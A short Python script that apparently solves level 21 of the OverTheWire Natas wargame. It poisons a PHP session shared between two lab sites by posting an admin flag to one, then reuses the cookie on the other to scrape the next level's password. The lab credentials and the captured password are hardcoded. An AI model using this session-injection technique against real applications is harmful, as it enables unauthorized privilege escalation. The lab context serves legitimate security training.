import requests
import re

url2 = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug'
auth = requests.auth.HTTPBasicAuth('natas21','IFekPyrQXftziDEsUr3x21sYuahypdgJ')
data = {'admin':'1','submit':'Update'}
r1 = requests.post(url2, auth=auth, data=data)

url1 = 'http://natas21.natas.labs.overthewire.org/?debug'
r2 = requests.get(url1, auth=auth, cookies={'PHPSESSID':r1.cookies['PHPSESSID']})
pwd = re.findall('Password: (.*)</pre>', r2.text)[0]
print(pwd) # chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ

